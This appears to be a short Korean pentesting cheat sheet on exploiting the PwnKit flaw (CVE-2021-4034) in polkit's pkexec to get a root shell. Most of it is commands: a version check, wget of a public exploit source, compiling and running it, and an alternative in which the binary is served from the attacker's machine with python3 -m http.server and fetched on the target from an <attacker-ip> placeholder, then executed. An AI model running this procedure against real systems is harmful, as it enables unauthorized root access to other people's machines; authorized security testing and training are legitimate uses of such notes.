- polkit의 pkexec에 있는 CVE-2021-4034(PwnKit) 로컬 권한 상승 취약점 악용 절차 — 버전 확인, pwnkit.c 컴파일, 실행으로 root 셸 확보
- 초기 셸에서 sudo -l과 SUID 열거로 마땅한 경로가 안 보일 때, 대부분의 리눅스에 기본 설치된 pkexec 버전부터 확인하는 표준 후보로 시도한다
- pkexec 버전이 0.105 이하면 취약하고, 대상에 gcc가 없으면 공격자 머신에서 컴파일해 python3 -m http.server로 업로드해 실행한다

```bash
pkexec --version
```

> 버전이 0.105 이하면 CVE-2021-4034 (PwnKit) 취약

---

## 🪜 Exploit (수동 방식)

### Exploit 소스 저장

```bash
# 설치
wget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/pwnkit.c
# 컴파일
gcc pwnkit.c -o pwnkit
# 실행
./pwnkit

```

만약 `gcc` 안 되면 로컬에서 컴파일 후 업로드:

```bash
# 공격자 머신에서:
gcc pwnkit.c -o pwnkit

# 업로드:
python3 -m http.server 8000
```

```bash
# 대상 머신에서:
wget http://<attacker-ip>:8000/pwnkit
chmod +x pwnkit
./pwnkit
```

# 쉘 확인

```bash
whoami
id
```
